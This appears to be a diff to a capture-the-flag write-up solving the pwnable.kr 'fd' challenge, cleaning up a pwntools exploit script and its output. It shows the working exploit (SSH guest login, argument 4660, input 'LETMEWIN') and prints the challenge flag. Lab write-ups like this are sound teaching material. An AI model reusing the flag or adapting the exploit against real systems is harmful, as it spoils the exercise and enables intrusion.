@@ -120,7 +120,7 @@ In this code we notice:
 Therefore, it is clear that to exploit this code to our advantage we will need to enter a number from the command line that allows us to redirect the `fd` file descriptor in our favor. Well this number is precisely the conversion into an integer of the number `0x1234` which can be obtained using the following command:
 
 ```
-fd@pwnable:~$ python -c "print(int(0x1234))"
+fd@pwnable:~$ python -c "print(0x1234)"
 4660
 ```
 
@@ -150,8 +150,11 @@ shell = ssh("fd", "pwnable.kr", password="guest", port=2222)
 process = shell.process(executable="./fd", argv=["fd", "4660"])
 process.sendline("LETMEWIN".encode())
 
-print(bytes(process.recv()))
-print("Flag: ", bytes(process.recv()))
+print(process.recv())
+print("Flag:", process.recv())
+
+process.close()
+shell.close()
 ```
 
 then using the `python exploit.py` command we get:
@@ -164,7 +167,9 @@ then using the `python exploit.py` command we get:
     Arch:     amd64
     Version:  4.4.179
     ASLR:     Enabled
-[+] Starting remote process bytearray(b'./fd') on pwnable.kr: pid 125468
+[+] Starting remote process bytearray(b'./fd') on pwnable.kr: pid 105486
 b'good job :)\n'
-Flag: b'mommy! I think I know what a file descriptor is!!\n' is!!\n'
+Flag: b'mommy! I think I know what a file descriptor is!!\n'
+[*] Stopped remote process 'fd' on pwnable.kr (pid 105486)
+[*] Closed connection to 'pwnable.kr'
 ```
